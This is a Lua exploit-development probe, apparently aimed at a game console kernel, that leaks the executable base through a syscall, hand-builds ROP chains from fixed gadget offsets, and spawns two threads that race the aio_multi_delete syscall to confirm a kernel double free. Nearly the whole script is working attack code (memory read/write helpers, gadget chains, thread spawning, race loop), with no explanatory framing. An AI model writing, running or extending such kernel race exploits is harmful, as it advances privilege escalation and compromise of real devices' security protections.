-- CRASH_CLASS: HIGH
-- PROBE 65l: aio_multi_delete TOCTOU — fixed multi-ID batch
--
-- 65k: batch submit(count=16) only returned 1 ID. Fix: submit each
-- request individually, collect all IDs. Then two children both
-- call 662(ids, N, states) concurrently.
--
-- Also: test if children can actually run concurrently by having each
-- write a marker BEFORE calling 662.

print("=== PROBE 65l: aio race — fixed batch ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0
end

-- Shared ID array for children
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
-- Concurrency markers
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

-- [A] Submit individually, confirm batch delete works
print("")
print("[A] submit " .. BATCH .. " individually")
local test_ids = {}
for i = 1, BATCH do
    local id = submit_one()
    if id ~= 0 then table.insert(test_ids, id) end
end
print(string.format("  got %d IDs (first=0x%X last=0x%X)", #test_ids,
    test_ids[1] or 0, test_ids[#test_ids] or 0))

-- Poll all
for _, id in ipairs(test_ids) do poll_one(id) end

-- Batch delete via single 662 call
for i = 0, #test_ids - 1 do
    wd(N(del_ids) + i * 4, test_ids[i + 1])
    wd(N(states_A) + i * 4, 0xDEAD)
end
pcall(function()
    mk(662)(uint64(N(del_ids)), uint64(#test_ids), uint64(N(states_A)))
end)
local ok_count = 0
for i = 0, #test_ids - 1 do
    if rd(N(states_A) + i * 4) == 0 then ok_count = ok_count + 1 end
end
print(string.format("  batch delete: %d/%d succeeded", ok_count, #test_ids))
if ok_count ~= #test_ids then
    print("  WARNING: not all deletes succeeded")
    for i = 0, #test_ids - 1 do
        local st = rd(N(states_A) + i * 4) or 0
        if st ~= 0 then
            print(string.format("    [%d] id=0x%X state=0x%X", i, test_ids[i + 1], st))
        end
    end
end

if not alive() then print("DEAD"); return end

-- [B] Race loop
print("")
print("[B] RACE — 2 children × " .. BATCH .. " IDs × 30 iters")

local ITERS = 30
local total_doubles = 0
local kptrs = 0
local a_total = 0
local b_total = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    -- Submit + poll BATCH requests individually
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < BATCH then
        print(string.format("  iter %d: only got %d IDs", iter, #ids))
        if #ids == 0 then break end
    end

    local count = #ids

    -- Write shared ID array
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Child A: write marker, then 662(del_ids, count, states_A), thr_exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    -- Write marker: mov [rdi], rax; ret
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    -- 662
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Child B: write marker, then 662(del_ids, count, states_B), thr_exit
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- Spawn both back-to-back
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait
    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Check concurrency
    local mA = rq(N(marker_A))
    local mB = rq(N(marker_B))
    local a_ran = (N(mA) ~= 0)
    local b_ran = (N(mB) ~= 0)

    -- Count results
    local a_ok = 0
    local b_ok = 0
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    a_total = a_total + a_ok
    b_total = b_total + b_ok
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLE DELETES *** A=%d B=%d ran=%s/%s",
            iter, doubles, a_ok, b_ok, a_ran and "Y" or "N", b_ran and "Y" or "N"))
    elseif iter <= 3 or iter == ITERS then
        print(string.format("  iter %d: A=%d B=%d ran=%s/%s",
            iter, a_ok, b_ok, a_ran and "Y" or "N", b_ran and "Y" or "N"))
    elseif iter == 4 then print("  ...") end
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:      %d", ITERS))
print(string.format("  IDs per iter:    %d", BATCH))
print(string.format("  total A success: %d", a_total))
print(string.format("  total B success: %d", b_total))
print(string.format("  DOUBLE DELETES:  %d", total_doubles))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if total_doubles > 0 then
    print("*** DOUBLE FREE CONFIRMED ***")
elseif b_total == 0 then
    print("B never won — threads serialize. Need multi-core or UMTX gate.")
elseif b_total > 0 then
    print("B won sometimes — race is live, need more iterations.")
end

print("")
print("=== 65l COMPLETE ===")
